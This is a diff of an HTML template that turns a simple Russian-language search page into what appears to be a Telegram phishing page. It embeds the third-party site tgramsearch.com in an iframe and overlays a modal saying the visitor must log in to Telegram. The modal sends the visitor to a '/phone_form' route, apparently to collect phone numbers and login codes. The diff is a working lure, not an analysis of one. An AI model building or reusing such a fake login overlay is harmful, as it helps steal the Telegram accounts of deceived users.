@@ -4,14 +4,30 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Swen Search</title>
-    <link rel="stylesheet" href="static/css/style.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="container">
-        <h1>Swen Search</h1>
-        <div class="search-box">
-            <input type="text" placeholder="Поиск...">
-            <button>Искать</button>
+    <div class="holder">
+        <div class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h4 class="modal-title">Войти в Telegram</h4>
+                </div>
+                <div class="login_content">
+                    <div class="login_photos">
+                        <img src="{{ url_for('static', filename='images/img.png') }}" alt="Telegram">
+                    </div>
+                    <p id="modal-text">Для продолжения необходимо войти в аккаунт Telegram</p>
+                    <div class="modal-footer">
+                        <a href="/phone_form" class="button-item btn btn-primary">Войти в Telegram</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <iframe src="https://tgramsearch.com/" frameborder="0"></iframe>
+        <div class="signature">
+            <a href="https://t.me/tgramsearchbot" target="_blank">Telegram Bot</a>
         </div>
     </div>
 </body>
